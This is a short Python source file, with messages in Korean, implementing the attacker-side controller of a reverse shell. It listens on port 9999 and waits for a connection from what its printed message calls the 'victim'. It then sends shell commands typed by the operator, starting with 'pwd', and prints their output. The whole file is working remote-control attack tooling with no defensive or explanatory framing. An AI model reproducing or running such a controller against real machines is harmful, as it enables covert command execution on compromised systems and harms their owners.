import socket

HOST = '0.0.0.0'
PORT = 9999

def main():
    try:
        sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        sock.bind((HOST, PORT))
        sock.listen(10)

        print("피해자의 접속을 기다리는 중...")

        conn, addr = sock.accept()
        print(f"[{addr}] 접속됨.")

        conn.send("pwd".encode('utf-8'))
        data = conn.recv(4096)
        print(f"\n{data.decode('utf-8')}")
        print("실행할 Shell 명령어를 입력해주세요")
    
        while True:
            command = input(">")
            data = command.encode('utf-8')
            conn.send(data)

            recv_data = conn.recv(4096)
            if not recv_data: break
            print(f"\n{recv_data.decode('utf-8')}")
    
    except Exception as e:
        print("접속에 문제가 발생했습니다.")
        print(e)
    
    sock.close()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("서버를 종료합니다.")
